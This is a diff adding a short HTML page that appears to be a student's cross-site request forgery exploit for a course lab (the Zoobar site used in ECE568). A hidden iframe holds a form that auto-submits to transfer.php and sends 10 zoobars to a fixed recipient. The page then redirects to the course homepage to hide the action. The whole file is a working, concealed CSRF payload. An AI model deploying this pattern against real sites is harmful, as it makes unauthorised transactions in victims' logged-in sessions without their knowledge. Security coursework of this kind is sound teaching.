@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+	<body>
+	<iframe srcdoc='
+	<html>
+		<head>
+		</head>
+		<body>
+			<form method="POST" name="transfer_form" action="http://zoobar.csl.toronto.edu/transfer.php">
+				<p>Send <input name="zoobars" value="10" size="5" type="text"> zoobars</p>
+				<p>to <input name="zb_recipient" value="g3wangjj" type="text"></p>
+				<input name="submission" id="my_transfer"  value="Send" type="submit">
+			</form>
+		</body>
+		<script>
+			window.onload = function(){
+				var transfer_form = document.getElementById("my_transfer");
+				transfer_form.click();
+			};
+		</script>
+	</html>
+	' 
+	width="150" height="150" seamless style="visibility: hidden"></iframe>
+
+	</body>
+	<script>
+		window.onload = function(){
+			document.location = "http://ece568.csl.toronto.edu/"
+		};
+	</script>
+</html>
